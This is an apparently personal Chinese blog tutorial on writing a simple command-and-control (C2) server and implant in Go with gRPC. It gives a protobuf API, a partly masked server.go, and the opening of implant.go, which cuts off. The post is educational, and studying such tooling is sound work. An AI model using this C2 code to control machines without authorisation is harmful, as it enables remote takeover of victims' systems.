<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>learn_to_write_a_C2_by_Go | Yliken</title><meta name="author" content="Yliken"><meta name="copyright" content="Yliken"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="近况: 清明假期第二天、还有些昨天哪些负面情绪😢。很难受，也很累 昨天发现自己在写东西的时候，可以让自己的暂时忽略掉这种负面情绪。 前几天chromos2me分享了一个新的C2框架，然后就想到了去年年底给chromos2me说过的要写一个极其简单的C2来着。 一直没写来着，今天趁机写了顺便放松一下自己吧。。。。。 😁  🔍什么是C2？C2即Command and Control  C2服务">
<meta property="og:type" content="article">
<meta property="og:title" content="learn_to_write_a_C2_by_Go">
<meta property="og:url" content="http://example.com/2025/04/05/Golang/learn_to_write_a_C2_by_Go/index.html">
<meta property="og:site_name" content="Yliken">
<meta property="og:description" content="近况: 清明假期第二天、还有些昨天哪些负面情绪😢。很难受，也很累 昨天发现自己在写东西的时候，可以让自己的暂时忽略掉这种负面情绪。 前几天chromos2me分享了一个新的C2框架，然后就想到了去年年底给chromos2me说过的要写一个极其简单的C2来着。 一直没写来着，今天趁机写了顺便放松一下自己吧。。。。。 😁  🔍什么是C2？C2即Command and Control  C2服务">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/essayhead/76.png">
<meta property="article:published_time" content="2025-04-04T16:00:00.000Z">
<meta property="article:modified_time" content="2025-07-14T13:20:57.734Z">
<meta property="article:author" content="Yliken">
<meta property="article:tag" content="C2">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/essayhead/76.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "learn_to_write_a_C2_by_Go",
  "url": "http://example.com/2025/04/05/Golang/learn_to_write_a_C2_by_Go/",
  "image": "http://example.com/img/essayhead/76.png",
  "datePublished": "2025-04-04T16:00:00.000Z",
  "dateModified": "2025-07-14T13:20:57.734Z",
  "author": [
    {
      "@type": "Person",
      "name": "Yliken",
      "url": "http://example.com/"
    }
  ]
}</script><link rel="shortcut icon" href="/images/essayhead/favicon.ico"><link rel="canonical" href="http://example.com/2025/04/05/Golang/learn_to_write_a_C2_by_Go/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          const hour = new Date().getHours()
          const isNight = hour <= 24 || hour >= 0
          if (theme === undefined) isNight ? activateDarkMode() : activateLightMode()
          else theme === 'light' ? activateLightMode() : activateDarkMode()
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'learn_to_write_a_C2_by_Go',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/wenzhang.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/essayhead/second.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">58</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">28</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-file-alt"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-scroll"></i><span> 阅读札记</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/reading/Whispers-of-Midie/"><i class="fa-fw fas fa-feather-alt"></i><span> 蝶梦笔语</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/memories/gallery/"><i class="fa-fw fas fa-images"></i><span> 图集</span></a></li><li><a class="site-page child" href="/memories/thoughts/"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span></a></li><li><a class="site-page child" href="/memories/plantRedBean/"><i class="fa-fw fas fa-seedling"></i><span> 红豆物语</span></a></li><li><a class="site-page child" href="/memories/unposted-wishes/"><i class="fa-fw fas fa-scroll"></i><span> 未寄之愿</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/essayhead/76.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/essayhead/second.jpg" alt="Logo"><span class="site-name">Yliken</span></a><a class="nav-page-title" href="/"><span class="site-name">learn_to_write_a_C2_by_Go</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-file-alt"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-scroll"></i><span> 阅读札记</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/reading/Whispers-of-Midie/"><i class="fa-fw fas fa-feather-alt"></i><span> 蝶梦笔语</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/memories/gallery/"><i class="fa-fw fas fa-images"></i><span> 图集</span></a></li><li><a class="site-page child" href="/memories/thoughts/"><i class="fa-fw fas fa-comment-dots"></i><span> 碎碎念</span></a></li><li><a class="site-page child" href="/memories/plantRedBean/"><i class="fa-fw fas fa-seedling"></i><span> 红豆物语</span></a></li><li><a class="site-page child" href="/memories/unposted-wishes/"><i class="fa-fw fas fa-scroll"></i><span> 未寄之愿</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">learn_to_write_a_C2_by_Go</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-04-04T16:00:00.000Z" title="发表于 2025-04-05 00:00:00">2025-04-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-14T13:20:57.734Z" title="更新于 2025-07-14 21:20:57">2025-07-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Golang/">Golang</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">2.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote>
<p>近况:</p>
<p>清明假期第二天、还有些昨天哪些负面情绪😢。很难受，也很累</p>
<p>昨天发现自己在写东西的时候，可以让自己的暂时忽略掉这种负面情绪。</p>
<p>前几天chromos2me分享了一个新的C2框架，然后就想到了去年年底给chromos2me说过的要写一个极其简单的C2来着。 一直没写来着，今天趁机写了顺便放松一下自己吧。。。。。 😁</p>
</blockquote>
<h2 id="🔍什么是C2？"><a href="#🔍什么是C2？" class="headerlink" title="🔍什么是C2？"></a>🔍什么是C2？</h2><p><strong>C2</strong>即<strong>Command and Control</strong> </p>
<p>C2服务器的概念基于命令和控制模型。攻击者扮演指挥官的角色，而受感染的设备则充当实现攻击者恶意命令的棋子</p>
<p>C2服务器充当攻击者和受感染设备之间通信的桥梁。出金各方之间的双向通信以及数据的传输</p>
<h4 id="远控木马RAT"><a href="#远控木马RAT" class="headerlink" title="远控木马RAT"></a>远控木马RAT</h4><p>RAT(Remote Access Trojan)是攻击者用来在受感染的计算机上远程执行操作的工具。</p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504052242197.png" alt="image-20250405224213657"></p>
<h2 id="🔍什么是RPC？"><a href="#🔍什么是RPC？" class="headerlink" title="🔍什么是RPC？"></a>🔍什么是RPC？</h2><p><strong>RPC(Remote Procedure Call) 远程过程调用:</strong></p>
<p> 它是一种计算机通信协议。 允许程序在一个计算机上面调用另一个函数</p>
<p>从<em><strong>本地函数调用</strong></em>来说，我们在程序中调用一个函数。比如: <code>add(2,3)</code>，程序会跳转到<code>add()</code>函数的定义去执行，然后返回结果。这个过程发生在我们自己的计算机上，也是你的程序内部</p>
<p>而<em><strong>远程过程调用</strong></em>则是我们像平时那样调用函数一样去调用它。它会自动将请求发送给远程服务器。执行之后返回结果。 这个观察没有发生在我们自己的计算机上面。</p>
<h3 id="🔍什么是gRPC"><a href="#🔍什么是gRPC" class="headerlink" title="🔍什么是gRPC"></a>🔍什么是gRPC</h3><p><strong>gRPC</strong>是<strong>Google</strong>开发的一个现代化的RPC框架。是一个</p>
<blockquote>
<p>:white_check_mark: “一个更快、更强、更智能的RPC工具“。 😊</p>
</blockquote>
<table>
<thead>
<tr>
<th>特性</th>
<th>gRPC</th>
</tr>
</thead>
<tbody><tr>
<td>🔄 通信协议</td>
<td>用的是 <strong>HTTP&#x2F;2</strong></td>
</tr>
<tr>
<td>📦 数据格式</td>
<td>用的是 <strong>Protocol Buffers（protobuf）</strong></td>
</tr>
<tr>
<td>🧠 多语言支持</td>
<td>支持 Python、Go、Java、C++ 等十几种语言</td>
</tr>
<tr>
<td>🚰 支持流式通信</td>
<td>不只是请求-响应，还可以实时双向传输数据</td>
</tr>
<tr>
<td>🛡 安全 &amp; 验证</td>
<td>内建支持 TLS，加密传输</td>
</tr>
</tbody></table>
<h2 id="🎯代码"><a href="#🎯代码" class="headerlink" title="🎯代码"></a>🎯代码</h2><p><strong>项目结构</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C2_by_Yliken_in_20250405</span><br><span class="line">    ├── client</span><br><span class="line">    │   └── client.go</span><br><span class="line">    ├── grpcapi</span><br><span class="line">    │   └── implant.proto</span><br><span class="line">    ├── implant</span><br><span class="line">    │   └── implant.go</span><br><span class="line">    ├── main.go</span><br><span class="line">    ├── server</span><br><span class="line">    │   └── server.go</span><br><span class="line">    ├── go.mod</span><br><span class="line">    └── go.sum</span><br></pre></td></tr></table></figure>

<h3 id="📌定义和构建gRPC-API"><a href="#📌定义和构建gRPC-API" class="headerlink" title="📌定义和构建gRPC API"></a>📌定义和构建gRPC API</h3><center>使用Protobuf 定义 gRPC API</center>

<p>代码</p>
<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;   <span class="comment">//指定使用Protocol Buffers的版本3语法</span></span><br><span class="line"><span class="keyword">package</span> grpcapi;    <span class="comment">//定义proto文件的包名 gprcapi</span></span><br><span class="line"><span class="keyword">option</span> go_package = <span class="string">&quot;./&quot;</span>;   <span class="comment">//指定生成的Go语言代码的包路径</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Implant 服务定义</span></span><br><span class="line"><span class="keyword">service </span><span class="title class_">Implant</span> &#123;</span><br><span class="line">  <span class="function"><span class="keyword">rpc</span> FetchCommand(Empty) <span class="keyword">returns</span> (Command)</span>; <span class="comment">// 定义一个远程过程调用(RPC) 方法 FetchCommand</span></span><br><span class="line">  <span class="function"><span class="keyword">rpc</span> SendOutput (Command) <span class="keyword">returns</span> (Empty)</span>;  <span class="comment">// 定义一个远程过程调用(RPC) 方法 SendOutput</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Admin 服务定义</span></span><br><span class="line"><span class="keyword">service </span><span class="title class_">Admin</span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">rpc</span> RunCommand (Command) <span class="keyword">returns</span>(Command)</span>;<span class="comment">// 定义一个远程过程调用(RPC) 方法 RunCommand</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个消息类型 Command</span></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Command</span>&#123;</span><br><span class="line">  <span class="type">string</span>  In = <span class="number">1</span>;  <span class="comment">//定义字段 In 类型为string,表示命令输入的内容.   =1 是字段的唯一编号,用于序列化时标识字段</span></span><br><span class="line">  <span class="type">string</span>  Out = <span class="number">2</span>; <span class="comment">//定义字段 In 类型为string,表示命令输出的结果.   =2 是该字段的唯一编号</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义消息类型 Empty</span></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Empty</span>&#123; <span class="comment">// 空类型 没有定义任何字段。 因此实例化后为空</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>message</code>名称以及他的字段名称可以随便取、Protobuf不强制要求具体名称。但是<code>message</code>的的每一个字段必须分配一个唯一的数字。这些数字用于在序列化后的二进制数据中标识字段。而不是<strong>字段的值</strong> 同时这也是下面这个问题的答案</li>
</ul>
<blockquote>
<p>为什么字段 <code>In</code> 和<code>Out</code>的数据类型是字符串，后面缺跟着数字？</p>
<p>答：</p>
<ul>
<li>这些数字不是子弹的值，而是字段的编号。Protobuf使用这些编号来区分消息中的字段。而不是直接使用字段名来区分</li>
<li>这些代码只是<code>.proto</code>文件的一个模式定义，只描述数据结构，不涉及具体实现或者赋值。实际赋值是在代码中完成的。</li>
</ul>
</blockquote>
<ul>
<li><code>Empty</code>这个消息中不包含任何字段。可以将其理解为<code>null</code>，即为空.</li>
</ul>
<blockquote>
<p>为什么要这样定义一个message类型呢？</p>
<p>答：</p>
<ul>
<li>事实上，Protobuf不支持直接传递<code>null</code>或者空值给RPC方法(比如 :  <code>rpc SomeMethod(Null) returns (Null)</code>。这种写法是错误的)</li>
<li>因此定义一个空message类型来绕过这种限制</li>
</ul>
</blockquote>
<p>在编写好<code>.proto</code>文件之后，使用<code>protoc -I . --go_out=. --go-grpc_out=. implant.proto</code>将<code>.proto</code>文件转换为Go语言代码</p>
<ul>
<li><code>protoc</code><ul>
<li>这是<code>Protocol Buffers</code>编译器的可执行文件。它负责读取<code>.proto</code>文件并生成目标语言代码。</li>
</ul>
</li>
<li><code>-I  .</code><ul>
<li><code>-I</code>是<code>--proto_path</code>的缩写，表示指定<code>.proto</code>文件的搜索路径。这里执行搜索路径是<code>.</code></li>
<li><code>.</code>表示当前目录</li>
</ul>
</li>
<li><code>--go_out=./</code><ul>
<li><code>--go_out</code>是一个标志，告诉<code>protoc</code>生Go语言代码,并指定输出目录</li>
<li><code>./</code>表示将生成的代码输出到当前目录</li>
<li>这个选项需要<code>protoc-gen-go</code>插件的支持。</li>
</ul>
</li>
<li><code>--go-grpc_out=.</code><ul>
<li><code>--go-grpc_out</code>参数用于指定生成的gRPC代码的输出目录。</li>
<li><code>.</code>同样表示当前目录</li>
<li>这个参数会为 <code>.proto</code> 文件中的服务定义生成 gRPC 相关的代码，比如服务的客户端和服务器端的接口。</li>
</ul>
</li>
<li><code>implant.proto</code><ul>
<li>这个是输入文件，也就是要编译的<code>.proto</code>文件</li>
</ul>
</li>
</ul>
<p>命令执行以后会生成一个<code>implant.pb.go</code>与<code>implant_grpc.pb.go</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grpcapi/</span><br><span class="line">├── implant_grpc.pb.go</span><br><span class="line">├── implant.pb.go</span><br><span class="line">└── implant.proto</span><br></pre></td></tr></table></figure>

<h3 id="📌创建服务器"><a href="#📌创建服务器" class="headerlink" title="📌创建服务器"></a>📌创建服务器</h3><center>编写server.go</center>

<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;C2_by_Yliken_in_20250405/grpcapi&quot;</span></span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;errors&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> implantServer <span class="keyword">struct</span> &#123;</span><br><span class="line">	grpcapi.UnimplementedImplantServer <span class="comment">// 嵌入未实现结构体</span></span><br><span class="line">	work, output                       <span class="keyword">chan</span> *grpcapi.Command</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">type</span> adminServer <span class="keyword">struct</span> &#123;</span><br><span class="line">	grpcapi.UnimplementedAdminServer <span class="comment">// 嵌入未实现结构体</span></span><br><span class="line">	work, output                     <span class="keyword">chan</span> *grpcapi.Command</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// implantServer的构造函数, 初始化并返回一个新的 implantServer示例</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewImplantServer</span><span class="params">(work, output <span class="keyword">chan</span> *grpcapi.Command)</span></span> *implantServer &#123;</span><br><span class="line">	s := <span class="built_in">new</span>(implantServer)</span><br><span class="line">	s.work = work</span><br><span class="line">	s.output = output</span><br><span class="line">	<span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// adminServer 的构造函数, 类似 implantServer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewAdminServer</span><span class="params">(work, output <span class="keyword">chan</span> *grpcapi.Command)</span></span> *adminServer &#123;</span><br><span class="line">	s := <span class="built_in">new</span>(adminServer)</span><br><span class="line">	s.work = work</span><br><span class="line">	s.output = output</span><br><span class="line">	<span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">*********************</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将命令发送到output通道返回空响应</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *implantServer)</span></span> SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, <span class="type">error</span>) &#123;</span><br><span class="line">	s.output &lt;- result</span><br><span class="line">	<span class="keyword">return</span> &amp;grpcapi.Empty&#123;&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *adminServer)</span></span> RunCommand(ctx context.Context, cmd *grpcapi.Command) (*grpcapi.Command, <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">var</span> res *grpcapi.Command</span><br><span class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">		s.work &lt;- cmd</span><br><span class="line">	&#125;()</span><br><span class="line">	res = &lt;-s.output</span><br><span class="line">	<span class="keyword">return</span> res, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">		声明变量</span></span><br><span class="line"><span class="comment">		* 两个网络监听器</span></span><br><span class="line"><span class="comment">		* 错误变量</span></span><br><span class="line"><span class="comment">		* gRPC服务器选项</span></span><br><span class="line"><span class="comment">		* 工作和输出管道</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="keyword">var</span> (</span><br><span class="line">		implanrListener, adminListener net.Listener</span><br><span class="line">		err                            <span class="type">error</span></span><br><span class="line">		opts                           []grpc.ServerOption</span><br><span class="line">		work, output                   <span class="keyword">chan</span> *grpcapi.Command</span><br><span class="line">	)</span><br><span class="line">	work, output = <span class="built_in">make</span>(<span class="keyword">chan</span> *grpcapi.Command), <span class="built_in">make</span>(<span class="keyword">chan</span> *grpcapi.Command)</span><br><span class="line"></span><br><span class="line">	******************************</span><br><span class="line">	grpcAdminServer.Serve(adminListener)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>写这个server.go的时候可能会出现一个无法导入<code>grpcapi</code>包中的方法的问题。</p>
<ul>
<li><p>这是因为<code>protoc</code>生成的<code>implant_grpc.pb.go</code>的<code>package</code>是<code>__</code></p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504052149370.png" alt="image-20250405214946169"></p>
<p>需要手动将其改成<code>package grpcapi</code></p>
<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202504052150399.png" alt="image-20250405215016336"></p>
</li>
</ul>
</li>
<li><p><code>implantServer</code>用于从<code>work</code>通道中 非阻塞的获取命令。 </p>
</li>
<li><p><code>SendOutput</code>则将命令执行的结果发送到<code>output</code>通道。</p>
</li>
<li><p><code>RunCommand</code>将命令发送到work通道，然后在output通道中等待处理结果</p>
</li>
<li><p><code>main</code>方法主要功能</p>
<ul>
<li>初始化 gRPC 服务器和相应的 TCP 监听器</li>
<li>注册处理命令的服务（<code>implantServer</code> 和 <code>adminServer</code>）</li>
<li>启动服务器并开始接收和处理客户端请求，从而提供命令的获取和执行功能。</li>
</ul>
</li>
</ul>
<h3 id="📌客户端植入程序"><a href="#📌客户端植入程序" class="headerlink" title="📌客户端植入程序"></a>📌客户端植入程序</h3><center>编写implant.go</center>

<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> 